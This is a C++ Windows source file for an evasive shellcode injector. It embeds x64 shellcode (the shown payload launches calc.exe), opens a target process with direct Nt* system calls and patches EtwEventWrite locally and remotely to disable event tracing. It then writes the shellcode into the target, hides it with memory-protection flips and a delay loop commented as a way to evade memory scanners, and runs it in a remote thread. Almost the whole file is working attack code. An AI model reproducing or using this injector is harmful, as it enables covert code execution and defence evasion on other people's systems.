#include <Windows.h>
#include <iostream>
#include "allcalls.h"
#include <TlHelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

size_t shellcode_len = sizeof(shellcode);

void prime() {

    int finalPrime = 0;
    int max = 50000; // 50000 = ~12s 100k = ~26
    bool hide = false;

    for (int i = 2; i < max; i++) {
        
        int latestPrime = 0;
        bool prime = true;
        bool first = true;

        for (int j = 2; j * j <= i; j++)
        {
            if (i % j == 0)
            {
                prime = false;
                if (first == true) {
                    first == false;
                }
                break;
            }
            finalPrime = i;
            std::cout << " ";
            
            if (hide == false) {
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                hide = true;
            }

        }


    }
}

void patchETW(LPVOID EEWAddress) {

    HANDLE curproc = GetCurrentProcess();
    UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; 
    size_t size = sizeof(patch);

    unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
    //LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

    DWORD oldprotect;
    LPVOID lpBaseAddress = EEWAddress;
    ULONG NewProtection;

    NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
    NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
    NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

}

void patchETWRemote(LPVOID EEWAddress, HANDLE remoteProc) {

    HANDLE targetProcHandle = remoteProc;

    DWORD oldprotect1;
    ULONG NewProtection1;

    UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; 
    size_t size = sizeof(patch);

    //unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

    //LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
    LPVOID lpBaseAddress = EEWAddress;

    NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
    NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
    NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}

HANDLE getHandle(int processID) {

    HANDLE targetProcHandle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID cid;
    cid.UniqueProcess = (PVOID)processID;
    cid.UniqueThread = 0;

    NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

    return targetProcHandle;

}

void run(HANDLE targetproc) {

    PVOID rbuffer = nullptr;
    HANDLE remoteThread;
    ULONG old_protect;

    // --- Decrypt Shellcode ---
    //XOR((char*)shellcode, shellcode_len, key, sizeof(key));

    // Allocate memory with permissions RW
    NtAllocateVirtualMemory(targetproc, &rbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    // Write code into memory
    NtWriteVirtualMemory(targetproc, rbuffer, shellcode, shellcode_len, nullptr);

    // Change memory to NO_ACCESS
    NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_NOACCESS, &old_protect);

    // Create thread in suspended state
    NtCreateThreadEx(&remoteThread, MAXIMUM_ALLOWED, NULL, targetproc, rbuffer, NULL, TRUE, 0, 0, 0, NULL);

    // Calculate prime numbers - Potentially evade memory scanners
    prime();

    // Change permissions to RX
    NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);
    
    // Resume thread to execute shellcode
    NtResumeThread(remoteThread, NULL);

    // Clean up
    NtFreeVirtualMemory(targetproc, &rbuffer, 0, MEM_RELEASE);
    NtClose(remoteThread);
    NtClose(targetproc);
    

}



int main(int argc, char** argv) {

    char* holderID = argv[1];
    int PID = atoi(holderID);

    HANDLE target = getHandle(PID);

    unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
    LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

    patchETW(EEWAddress);
    patchETWRemote(EEWAddress, target);

    run(target);
    
}
